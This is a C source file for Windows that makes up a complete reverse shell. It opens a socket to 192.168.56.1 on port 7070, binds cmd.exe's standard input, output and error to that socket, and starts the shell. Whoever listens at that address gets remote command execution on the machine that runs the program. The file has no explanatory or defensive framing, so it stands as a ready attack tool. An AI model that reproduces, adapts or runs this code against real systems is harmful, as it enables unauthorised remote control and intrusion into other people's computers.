#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib")
#include <WinSock2.h>
#include <Windows.h>

int main()
{
	WSADATA wsaData;
	SOCKET sockfd;
	SOCKADDR_IN servaddr;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		fprintf(stderr, "WSAStartup() error\n");

	if ((sockfd = WSASocketA(2, 1, 6, NULL, 0, NULL)) == INVALID_SOCKET) {
	//if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		fprintf(stderr, "socket error\n");
	}

	memset(&servaddr, 0, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.S_un.S_addr = inet_addr("192.168.56.1");
	servaddr.sin_port = htons(7070);

	if (connect(sockfd, (SOCKADDR*)&servaddr, sizeof(servaddr)) == SOCKET_ERROR) {
		fprintf(stderr, "connect() error\n");
	}

	STARTUPINFO si;
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi;
	si.dwFlags = (STARTF_USESTDHANDLES);
	si.hStdInput = (HANDLE)sockfd;
	si.hStdOutput = (HANDLE)sockfd;
	si.hStdError = (HANDLE)sockfd;

	TCHAR processName[100] = TEXT("cmd.exe");

	if (!CreateProcess(NULL, processName, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		printf("CreateProcess failed: %d\n", GetLastError());
		return 1;
	}

	closesocket(sockfd);
	WSACleanup();
}